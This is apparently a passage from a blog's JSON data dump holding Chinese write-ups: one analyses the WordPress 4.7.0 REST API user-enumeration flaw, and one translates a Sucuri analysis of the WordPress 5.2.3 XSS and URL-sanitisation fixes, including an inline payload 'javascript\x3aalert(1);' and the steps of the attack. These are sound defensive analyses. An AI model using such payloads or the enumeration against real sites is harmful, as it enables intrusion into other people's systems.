true;\n}\n</pre>\n\n看上面的注释可以大概了解这个函数的功能：当请求users参数时，用来检查请求是否有读的权限，否则爆出WP_Error错误。\n\n这个函数一共有三个if判断，这三个if判断都是由两部分组成的，每一个后半部分都是不可控的current_user_can( 'list_users' )，经测试，它的值还为false，所以只能使三个if得可控的前半部分不为真，才能最终绕过判定。\n\n我们var_dump下这三个$request值\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/e7da561195b2fa06e586fb23400b6666.png)\n\n有意思的事情发生了，我们什么事情也没做，竟然完美的避开了权限检查的三个判定，接下来进入下个环节get_items函数，检索所有的用户。\n\n<pre class=\"lang:default decode:true \">/**\n * Retrieves all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.\n */\npublic function get_items( $request ) {\n。。。。。。。。。\n/**\n * Filters WP_User_Query arguments when querying users via the REST API.\n *\n * @link https://developer.wordpress.org/reference/classes/wp_user_query/\n *\n * @since 4.7.0\n *\n * @param array           $prepared_args Array of arguments for WP_User_Query.\n * @param WP_REST_Request $request       The current request.\n */\n$prepared_args = apply_filters( 'rest_user_query', $prepared_args, $request );\n\n$query = new WP_User_Query( $prepared_args );\n\n$users = array();\n\nforeach ( $query-&gt;results as $user ) {\n   $data = $this-&gt;prepare_item_for_response( $user, $request );\n   $users[] = $this-&gt;prepare_response_for_collection( $data );\n}\n\n$response = rest_ensure_response( $users );\n。。。。。。。。。。。\n</pre>\n\n上面代码省略了些内容，前半部分省略的是一些相关的参数配置，然后读到注释部分了解到下面参数经过过滤，就要进入WP_User_Query()部分了，我们通过给出的链接看一下查询部分的WP_User_Query()是怎么解释的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/9e8c928a2feb9cd56323f430459e4063.png)\n\n在跟进WP_User_Query中我们可以看到一个构造方法\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/8d5c805f0c49d37390e960741e07a7ef.png)\n\n在这里可以看到如果$query不为空，则先调用prepare_query(),接着再执行$this-&gt;query()\n\n我们看一下prepare_query()是做什么的。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/fe7439ec2941f80fc6e94cffd89036b3.png)\n\n看注释可以了解到，它是准备查询变量的作用，可以看做是对变量的预处理。\n接下来往后看$this-&gt;query();。跟进query()函数看看它最终执行了什么。\n\n<pre class=\"lang:default decode:true \">/**\n * Execute the query, with the current variables.\n *\n * @since 3.1.0\n *\n * @global wpdb $wpdb WordPress database abstraction object.\n */\npublic function query() {\n   global $wpdb;\n\n   $qv =&amp; $this-&gt;query_vars;\n\n   $this-&gt;request = \"SELECT $this-&gt;query_fields $this-&gt;query_from $this-&gt;query_where $this-&gt;query_orderby $this-&gt;query_limit\";\n\n   if ( is_array( $qv['fields'] ) || 'all' == $qv['fields'] ) {\n      $this-&gt;results = $wpdb-&gt;get_results( $this-&gt;request );\n   } else {\n      $this-&gt;results = $wpdb-&gt;get_col( $this-&gt;request );\n   }\n</pre>\n\nquery()函数使用当前变量来执行查询，下面$this-&gt;request构造了一个sql查询语句，我们查看下它的值\n\n<pre class=\"lang:default decode:true \">SELECT SQL_CALC_FOUND_ROWS wp_users.* FROM wp_users WHERE 1=1 AND wp_users.ID IN ( SELECT DISTINCT wp_posts.post_author FROM wp_posts WHERE wp_posts.post_status = 'publish' AND wp_posts.post_type IN ( 'post', 'page', 'attachment' ) ) ORDER BY display_name ASC LIMIT 0, 10</pre>\n\n可以看出这里可以查询的wp_users信息是有约束条件的，这里可以查询的用户必须满足发表过‘publish’类型的文章，并且类型还要是‘post’、‘page’、‘attachment’中的一个\n\n我们分别看一下wp_users表和wp_posts表\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/4e1ac26138b89470e2c9f99061cb0663.png)\n\nwp_posts表\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/d19cbe6d4cccec7579e07aeb73f90dac.png)\n\nwp_users表\n\n最终通过api返回的用户信息\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/03/ff24e8f258f281b3b57e4863202ca9a0.png)\n\n## 修补防御\n\n升级wordpress至最新版本。\n","slug":"wordpress-user-enumeration-vulnerability-analysis","published":1,"updated":"2020-10-27T09:27:09.808Z","_id":"ckgrozua8005jwsa95ximfs5u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>WordPress是一种使用<a href=\"http://blog.nsfocus.net/tag/php/\">PHP</a>语言开发的博客平台，用户可以在支持<a href=\"http://blog.nsfocus.net/tag/php/\">PHP</a>和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。<a id=\"more\"></a></p>\n<p>WordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限查看wordpress上所有发布过文章的用户信息列表。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>WordPress 4.7.0</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fbf1ee02736f1efd0aee8183b2c7872c.png\"></p>\n<p>具体使用详情请参照REST API Handbook</p>\n<p><a href=\"https://developer.wordpress.org/rest-api/\">https://developer.wordpress.org/rest-api/</a>，</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>先从exploitdb上面提供的poc入手</p>\n<p><a href=\"https://www.exploit-db.com/exploits/41497/\">https://www.exploit-db.com/exploits/41497/</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fc442c07ec267747e57952b08896bc80.png\"></p>\n<p>POC看起来比较简单，就是调用了wordpress的rest api接口进行users查询，但是在笔者的环境中，需要对这个poc进行一点小改动，如下图，需要加上一个index.php，否则找不到目录。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fe547095c138ccaae959fa182cb61026.png\"></p>\n<p>接下来看一下代码， 请求首先进入get_items_permissions_check模块进行权限检查</p>\n<pre class=\"lang:default decode:true \">/**\n * Permissions check for getting all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return true|WP_Error True if the request has read access, otherwise WP_Error object.\n */\npublic function get_items_permissions_check( $request ) {\n   // Check if roles is specified in GET request and if user can list users.\n   if ( ! empty( $request['roles'] ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_user_cannot_view', __( 'Sorry, you are not allowed to filter users by role.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( 'edit' === $request['context'] &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_context', __( 'Sorry, you are not allowed to list users.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( in_array( $request['orderby'], array( 'email', 'registered_date' ), true ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_orderby', __( 'Sorry, you are not allowed to order users by this parameter.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n<p>看上面的注释可以大概了解这个函数的功能：当请求users参数时，用来检查请求是否有读的权限，否则爆出WP_Error错误。</p>\n<p>这个函数一共有三个if判断，这三个if判断都是由两部分组成的，每一个后半部分都是不可控的current_user_can( ‘list_users’ )，经测试，它的值还为false，所以只能使三个if得可控的前半部分不为真，才能最终绕过判定。</p>\n<p>我们var_dump下这三个$request值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/e7da561195b2fa06e586fb23400b6666.png\"></p>\n<p>有意思的事情发生了，我们什么事情也没做，竟然完美的避开了权限检查的三个判定，接下来进入下个环节get_items函数，检索所有的用户。</p>\n<pre class=\"lang:default decode:true \">/**\n * Retrieves all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.\n */\npublic function get_items( $request ) {\n。。。。。。。。。\n/**\n * Filters WP_User_Query arguments when querying users via the REST API.\n *\n * @link https://developer.wordpress.org/reference/classes/wp_user_query/\n *\n * @since 4.7.0\n *\n * @param array           $prepared_args Array of arguments for WP_User_Query.\n * @param WP_REST_Request $request       The current request.\n */\n$prepared_args = apply_filters( 'rest_user_query', $prepared_args, $request );\n\n$query = new WP_User_Query( $prepared_args );\n\n$users = array();\n\nforeach ( $query-&gt;results as $user ) {\n   $data = $this-&gt;prepare_item_for_response( $user, $request );\n   $users[] = $this-&gt;prepare_response_for_collection( $data );\n}\n\n$response = rest_ensure_response( $users );\n。。。。。。。。。。。\n</pre>\n\n<p>上面代码省略了些内容，前半部分省略的是一些相关的参数配置，然后读到注释部分了解到下面参数经过过滤，就要进入WP_User_Query()部分了，我们通过给出的链接看一下查询部分的WP_User_Query()是怎么解释的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/9e8c928a2feb9cd56323f430459e4063.png\"></p>\n<p>在跟进WP_User_Query中我们可以看到一个构造方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/8d5c805f0c49d37390e960741e07a7ef.png\"></p>\n<p>在这里可以看到如果$query不为空，则先调用prepare_query(),接着再执行$this-&gt;query()</p>\n<p>我们看一下prepare_query()是做什么的。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fe7439ec2941f80fc6e94cffd89036b3.png\"></p>\n<p>看注释可以了解到，它是准备查询变量的作用，可以看做是对变量的预处理。<br>接下来往后看$this-&gt;query();。跟进query()函数看看它最终执行了什么。</p>\n<pre class=\"lang:default decode:true \">/**\n * Execute the query, with the current variables.\n *\n * @since 3.1.0\n *\n * @global wpdb $wpdb WordPress database abstraction object.\n */\npublic function query() {\n   global $wpdb;\n\n   $qv =&amp; $this-&gt;query_vars;\n\n   $this-&gt;request = \"SELECT $this-&gt;query_fields $this-&gt;query_from $this-&gt;query_where $this-&gt;query_orderby $this-&gt;query_limit\";\n\n   if ( is_array( $qv['fields'] ) || 'all' == $qv['fields'] ) {\n      $this-&gt;results = $wpdb-&gt;get_results( $this-&gt;request );\n   } else {\n      $this-&gt;results = $wpdb-&gt;get_col( $this-&gt;request );\n   }\n</pre>\n\n<p>query()函数使用当前变量来执行查询，下面$this-&gt;request构造了一个sql查询语句，我们查看下它的值</p>\n<pre class=\"lang:default decode:true \">SELECT SQL_CALC_FOUND_ROWS wp_users.* FROM wp_users WHERE 1=1 AND wp_users.ID IN ( SELECT DISTINCT wp_posts.post_author FROM wp_posts WHERE wp_posts.post_status = 'publish' AND wp_posts.post_type IN ( 'post', 'page', 'attachment' ) ) ORDER BY display_name ASC LIMIT 0, 10</pre>\n\n<p>可以看出这里可以查询的wp_users信息是有约束条件的，这里可以查询的用户必须满足发表过‘publish’类型的文章，并且类型还要是‘post’、‘page’、‘attachment’中的一个</p>\n<p>我们分别看一下wp_users表和wp_posts表</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/4e1ac26138b89470e2c9f99061cb0663.png\"></p>\n<p>wp_posts表</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/d19cbe6d4cccec7579e07aeb73f90dac.png\"></p>\n<p>wp_users表</p>\n<p>最终通过api返回的用户信息</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/ff24e8f258f281b3b57e4863202ca9a0.png\"></p>\n<h2 id=\"修补防御\"><a href=\"#修补防御\" class=\"headerlink\" title=\"修补防御\"></a>修补防御</h2><p>升级wordpress至最新版本。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg","excerpt":"<p>WordPress是一种使用<a href=\"http://blog.nsfocus.net/tag/php/\">PHP</a>语言开发的博客平台，用户可以在支持<a href=\"http://blog.nsfocus.net/tag/php/\">PHP</a>和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。","more":"</p>\n<p>WordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限查看wordpress上所有发布过文章的用户信息列表。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>WordPress 4.7.0</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下:</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fbf1ee02736f1efd0aee8183b2c7872c.png\"></p>\n<p>具体使用详情请参照REST API Handbook</p>\n<p><a href=\"https://developer.wordpress.org/rest-api/\">https://developer.wordpress.org/rest-api/</a>，</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>先从exploitdb上面提供的poc入手</p>\n<p><a href=\"https://www.exploit-db.com/exploits/41497/\">https://www.exploit-db.com/exploits/41497/</a></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fc442c07ec267747e57952b08896bc80.png\"></p>\n<p>POC看起来比较简单，就是调用了wordpress的rest api接口进行users查询，但是在笔者的环境中，需要对这个poc进行一点小改动，如下图，需要加上一个index.php，否则找不到目录。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fe547095c138ccaae959fa182cb61026.png\"></p>\n<p>接下来看一下代码， 请求首先进入get_items_permissions_check模块进行权限检查</p>\n<pre class=\"lang:default decode:true \">/**\n * Permissions check for getting all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return true|WP_Error True if the request has read access, otherwise WP_Error object.\n */\npublic function get_items_permissions_check( $request ) {\n   // Check if roles is specified in GET request and if user can list users.\n   if ( ! empty( $request['roles'] ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_user_cannot_view', __( 'Sorry, you are not allowed to filter users by role.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( 'edit' === $request['context'] &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_context', __( 'Sorry, you are not allowed to list users.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( in_array( $request['orderby'], array( 'email', 'registered_date' ), true ) &amp;&amp; ! current_user_can( 'list_users' ) ) {\n      return new WP_Error( 'rest_forbidden_orderby', __( 'Sorry, you are not allowed to order users by this parameter.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n<p>看上面的注释可以大概了解这个函数的功能：当请求users参数时，用来检查请求是否有读的权限，否则爆出WP_Error错误。</p>\n<p>这个函数一共有三个if判断，这三个if判断都是由两部分组成的，每一个后半部分都是不可控的current_user_can( ‘list_users’ )，经测试，它的值还为false，所以只能使三个if得可控的前半部分不为真，才能最终绕过判定。</p>\n<p>我们var_dump下这三个$request值</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/e7da561195b2fa06e586fb23400b6666.png\"></p>\n<p>有意思的事情发生了，我们什么事情也没做，竟然完美的避开了权限检查的三个判定，接下来进入下个环节get_items函数，检索所有的用户。</p>\n<pre class=\"lang:default decode:true \">/**\n * Retrieves all users.\n *\n * @since 4.7.0\n * @access public\n *\n * @param WP_REST_Request $request Full details about the request.\n * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.\n */\npublic function get_items( $request ) {\n。。。。。。。。。\n/**\n * Filters WP_User_Query arguments when querying users via the REST API.\n *\n * @link https://developer.wordpress.org/reference/classes/wp_user_query/\n *\n * @since 4.7.0\n *\n * @param array           $prepared_args Array of arguments for WP_User_Query.\n * @param WP_REST_Request $request       The current request.\n */\n$prepared_args = apply_filters( 'rest_user_query', $prepared_args, $request );\n\n$query = new WP_User_Query( $prepared_args );\n\n$users = array();\n\nforeach ( $query-&gt;results as $user ) {\n   $data = $this-&gt;prepare_item_for_response( $user, $request );\n   $users[] = $this-&gt;prepare_response_for_collection( $data );\n}\n\n$response = rest_ensure_response( $users );\n。。。。。。。。。。。\n</pre>\n\n<p>上面代码省略了些内容，前半部分省略的是一些相关的参数配置，然后读到注释部分了解到下面参数经过过滤，就要进入WP_User_Query()部分了，我们通过给出的链接看一下查询部分的WP_User_Query()是怎么解释的</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/9e8c928a2feb9cd56323f430459e4063.png\"></p>\n<p>在跟进WP_User_Query中我们可以看到一个构造方法</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/8d5c805f0c49d37390e960741e07a7ef.png\"></p>\n<p>在这里可以看到如果$query不为空，则先调用prepare_query(),接着再执行$this-&gt;query()</p>\n<p>我们看一下prepare_query()是做什么的。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/fe7439ec2941f80fc6e94cffd89036b3.png\"></p>\n<p>看注释可以了解到，它是准备查询变量的作用，可以看做是对变量的预处理。<br>接下来往后看$this-&gt;query();。跟进query()函数看看它最终执行了什么。</p>\n<pre class=\"lang:default decode:true \">/**\n * Execute the query, with the current variables.\n *\n * @since 3.1.0\n *\n * @global wpdb $wpdb WordPress database abstraction object.\n */\npublic function query() {\n   global $wpdb;\n\n   $qv =&amp; $this-&gt;query_vars;\n\n   $this-&gt;request = \"SELECT $this-&gt;query_fields $this-&gt;query_from $this-&gt;query_where $this-&gt;query_orderby $this-&gt;query_limit\";\n\n   if ( is_array( $qv['fields'] ) || 'all' == $qv['fields'] ) {\n      $this-&gt;results = $wpdb-&gt;get_results( $this-&gt;request );\n   } else {\n      $this-&gt;results = $wpdb-&gt;get_col( $this-&gt;request );\n   }\n</pre>\n\n<p>query()函数使用当前变量来执行查询，下面$this-&gt;request构造了一个sql查询语句，我们查看下它的值</p>\n<pre class=\"lang:default decode:true \">SELECT SQL_CALC_FOUND_ROWS wp_users.* FROM wp_users WHERE 1=1 AND wp_users.ID IN ( SELECT DISTINCT wp_posts.post_author FROM wp_posts WHERE wp_posts.post_status = 'publish' AND wp_posts.post_type IN ( 'post', 'page', 'attachment' ) ) ORDER BY display_name ASC LIMIT 0, 10</pre>\n\n<p>可以看出这里可以查询的wp_users信息是有约束条件的，这里可以查询的用户必须满足发表过‘publish’类型的文章，并且类型还要是‘post’、‘page’、‘attachment’中的一个</p>\n<p>我们分别看一下wp_users表和wp_posts表</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/4e1ac26138b89470e2c9f99061cb0663.png\"></p>\n<p>wp_posts表</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/d19cbe6d4cccec7579e07aeb73f90dac.png\"></p>\n<p>wp_users表</p>\n<p>最终通过api返回的用户信息</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/03/ff24e8f258f281b3b57e4863202ca9a0.png\"></p>\n<h2 id=\"修补防御\"><a href=\"#修补防御\" class=\"headerlink\" title=\"修补防御\"></a>修补防御</h2><p>升级wordpress至最新版本。</p>"},{"title":"【翻译】浅析WordPress 5.2.3安全更新","date":"2019-09-24T06:31:56.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RISP等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。\n\n<!--more-->\n\n这篇文章是来自Sucuri安全公司的Marc-Alexandre Montpas，他对于WordPress 5.2.3安全更新进行了diff后，对更新的内容提出了自己的见解。文章中虽然没有给出明确的利用，但是针对安全补丁分析与逆推的思路，却很好玩。\n\n正如作者本人说的\n\n**“Reversing security patches is an interesting challenge”**\n\n下面翻译稿正文开始\n\n# 前言\n\n上周，[WordPress发布了5.2.3版本](https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/)，此版本是一个安全维护更新版本，因此包含许多安全修复程序。我们日常工作的一部分是分析这些安全版本，发现它正在修复的安全问题，并为进一步的内测制作poc。\n\n基于我们的分析，此版本并没有高危漏洞被修复。已修复的漏洞都需要某种程度的限制，像是需要用户交互或拥有高权限帐户。在某些情况下，这些漏洞这只能由目标主动触发，在这种情况下，为了成功利用它们，需要进行一些细致的社会工程学工作。\n\n尽管如此，您还是应该及时更新您的站点以保护自己免受这些攻击。\n\n本文提供了更多关于WordPress 5.2.3版本修复漏洞过程中的有趣细节。\n\n# 技术分析\n\n## 在Post Preview中存在存储型XSS漏洞\n\nWordPress似乎有一段旧代码，它最初旨在通过将UTF-8 URL编码为HTML实体来解决*“JavaScript bug with foreign languages*”问题。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111010-fd8ecbca-da8a-1.png)<https://core.trac.wordpress.org/changeset/45935>\n\n事实证明，它可能使具有某种权限的攻击者（如contributors投稿者）将XSS存储在陷阱帖中。要使该攻击起作用，需要具有更高权限的另一个用户（如管理员）预览该帖子。\n\n利用此漏洞的一种可行方法是：恶意的contributors身份用户在其帖子中添加锚标签指向：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111024-05f72730-da8b-1.png)\n **％u003A**部分将被回调函数解码，从而导致代码变为\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111033-0b764290-da8b-1.png)\n 这将被解析为JavaScript，并在单击该锚链接后启动弹框。\n\n## 在评论中存在存储型XSS漏洞\n\n更新日志中提到以下内容：\n\n**“第二个是存储评论中的跨站点脚本漏洞。”**\n\n从技术角度来看，这条线是模棱两可的。可以通过两种不同的方式来理解：\n\n1.    被修复的issue是影响 WordPress 评论系统存储的XSS漏洞\n\n2.    可以通过使用存储在网站上的评论来利用此漏洞，这意味着需要执行更多步骤才能成功进行攻击。\n\n初步分析显示，这可能是后者，并且需要使用攻击者的评论，使得站点管理员执行一些非常具体的步骤。如果这是唯一可以利用此漏洞的情况，我们*高度*怀疑是否会在实战中看到尝试利用此漏洞的案例。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111050-156bc5a4-da8b-1.png)<https://core.trac.wordpress.org/changeset/45990/>\n\n在更改中可见， **wp_rel_nofollow_callback****函数**被用来调用**shortcode_parse_atts函数从而分析**HTML标签属性。虽然此用例接近其设计目的，但是短代码提供了常规HTML标签所没有的一些功能，如：[支持类似C的转义序列](https://en.wikipedia.org/wiki/Escape_sequences_in_C)。\n\n这是一个大问题，因为如果检测到**rel**属性，解码值将重新追加到最终注释中。不幸的是，对于攻击者来说，普通游客不可能直接在评论中添加该属性，因为[wp_kses](https://codex.wordpress.org/Function_Reference/wp_kses)并没有明确该属性，因此需要执行多个步骤。\n\n攻击流程如下：\n\n1.    攻击者发布恶意评论，其中包含以下内容的锚点：**href =“javascript \\ x3aalert（1）;”**。\n\n2.    该**wp_rel_nofollow_callback**自动添加一个**rel=” nofollow”**属性的标签。\n\n3.    管理员需要在管理仪表板上打开注释编辑视图，并不修改任何内容的情况下重新保存该注释。这将强制脚本解码该标记所有属性中的转义序列。然后**href**属性将包含**javascript：alert（1）;** 允许Javascript代码在单击该链接时运行。\n\n## 媒体上传中存在反射型XSS\n\n仅当用户尝试使用特制文件名上传文件时，而他无权在此上下文中上传文件，才会发生此漏洞，。\n\n这可能是以下几种情况之一：\n\n1. 用户根本无法上传文件。\n\n3. 用户无法上传指定帖子上的文件。\n\n5. 用户尝试使用无效文件替换标题或背景图像。\n\n包含文件名和HTML内容类型的响应将包含XSS。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111107-1f37ec0c-da8b-1.png)\n\n由于此操作受**nonce**保护，因此不能在跨站点请求伪造（CSRF）中用它来攻击其他用户。\n\n通过在所有场景下使用**esc_html**转义文件名以及将**text/ html**中响应的内容类型替换为**text / plain**来修复此漏洞。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111123-294d8666-da8b-1.png)\n\n您可以在此处查看WordPress trac上的完整更改日志：[https](https://core.trac.wordpress.org/changeset/45936)：[//core.trac.wordpress.org/changeset/45936](https://core.trac.wordpress.org/changeset/45936)\n\n## URL清理问题\n\n[esc_url函数](https://codex.wordpress.org/Function_Reference/esc_url)用于清理URL，以便可以安全地将其附加到HTML标记属性的上下文中。遗憾的是，由于**esc_url**中用来验证给定URL中使用协议的**wp_kses_bad_protocol_once**函数中存在漏洞，有一些方法可以绕过**esc_url**的保护。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111143-34c6962c-da8b-1.png)<https://core.trac.wordpress.org/changeset/45997>\n\n根据补丁，此函数在处理不完整的HTML实体时，可能无法检测到恶意协议，即使它们缺少结束分号，浏览器仍然可以正确解码这些实体。\n\n因此，攻击者可以使用如下URL来绕过该保护：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111159-3e6352d8-da8b-1.png)\n\n## JQuery更新修补“原型污染”\n\nWordPress使用[最新的安全更新](https://core.trac.wordpress.org/ticket/47020)修补了其JQuery版本。\n\n此更新消除了利用原型污染漏洞攻击的可能性。目前并没有使用该技术的已知漏洞。\n\n# 结论\n\n逆推安全补丁是一项有趣的挑战。仅仅使用补丁，你就要推断出基本的意图是什么。有时，这是一项琐碎的练习，修复与问题之间存在直接关系。\n\n其他时候，正如这个版本所阐明的那样，你必须后退一步，才有更大的格局; 研究点与点之间如何互连; 排除攻击者会攻击的明显死角，剩下的东西往往是你正在寻找的问题所在。\n\n如果您的WordPress安装尚未自动更新，我们强烈建议您尽快升级。\n\n原文链接：https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html","source":"_posts/wordpress5-update.md","raw":"---\ntitle: 【翻译】浅析WordPress 5.2.3安全更新\ndate: 2019-09-24 14:31:56\ntags: 翻译\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RISP等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。\n\n<!--more-->\n\n这篇文章是来自Sucuri安全公司的Marc-Alexandre Montpas，他对于WordPress 5.2.3安全更新进行了diff后，对更新的内容提出了自己的见解。文章中虽然没有给出明确的利用，但是针对安全补丁分析与逆推的思路，却很好玩。\n\n正如作者本人说的\n\n**“Reversing security patches is an interesting challenge”**\n\n下面翻译稿正文开始\n\n# 前言\n\n上周，[WordPress发布了5.2.3版本](https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/)，此版本是一个安全维护更新版本，因此包含许多安全修复程序。我们日常工作的一部分是分析这些安全版本，发现它正在修复的安全问题，并为进一步的内测制作poc。\n\n基于我们的分析，此版本并没有高危漏洞被修复。已修复的漏洞都需要某种程度的限制，像是需要用户交互或拥有高权限帐户。在某些情况下，这些漏洞这只能由目标主动触发，在这种情况下，为了成功利用它们，需要进行一些细致的社会工程学工作。\n\n尽管如此，您还是应该及时更新您的站点以保护自己免受这些攻击。\n\n本文提供了更多关于WordPress 5.2.3版本修复漏洞过程中的有趣细节。\n\n# 技术分析\n\n## 在Post Preview中存在存储型XSS漏洞\n\nWordPress似乎有一段旧代码，它最初旨在通过将UTF-8 URL编码为HTML实体来解决*“JavaScript bug with foreign 